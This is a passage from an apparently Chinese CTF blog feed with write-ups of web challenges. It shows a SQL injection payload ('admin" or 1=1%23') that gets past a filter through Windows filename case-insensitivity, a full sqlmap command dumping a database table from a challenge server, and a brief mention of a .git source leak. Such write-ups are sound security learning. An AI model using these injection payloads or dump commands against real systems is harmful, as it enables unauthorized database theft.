class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10007/?A+A[]=admin</span><br></pre></td></tr></table></figure><h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><p>这一个题目利用了Windows不区分大小写特性的特点<br>右键发现发现有一段代码很可疑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>仔细查看代码发现存在<code>json.php</code>还有post一个id参数，到后面看了解题的视频发现其实这里还能用get方式传参，我们就进去json.php页面查看一下，竟然题目说了要admin就传一个admin进去，发现有回显<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>，尝试一下是否存在sql注入漏洞，在尝试双引号的时候发现有报错信息，然后详细一点测试<code>json.php?id=admin&quot; or 1=1%23</code>,发现有检测，这就很尬，后来还是看了视频才知道是从头部信息哪里发现的服务器是<code>Windows</code>的，这样就可以用Windows的大小写特性去绕过，就可以尝试一下<code>json.phP?id=admin&quot; or 1=1%23</code>，重新回显<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>，这就可以慢慢注入了啊，接下来就是sqlmap一把过就行。。。。说实话我是真想不到，还是要虚心学习啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://101.71.29.5:10006/json.Php?id=admin&quot;  --threads 10 -D 5monthweb -T article -C content --dump</span><br></pre></td></tr></table></figure><p>最后得到结果<br><img src="https://s1.ax1x.com/2018/05/24/CWrves.png" alt="CWrves.png"></p><h2 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h2><p>这题考了.git源码泄露，把源码拿下来以后打算第二天做。。。这个题目第二天做的时候因为平台维护不能复现了，下次还是早点做吧。。还得继续努力。。。。。</p><p><img src="https://s1.ax1x.com/2018/05/24/CWrzoq.png" alt="CWrzoq.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;p&gt;这是一道代码审计的题目，又发现了一个我以前没见过的知识点，可以详细看看这个链接&lt;br&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=64792&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://wooyun.shuimugan.com/bug/view?bug_no=64792&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
</feed>
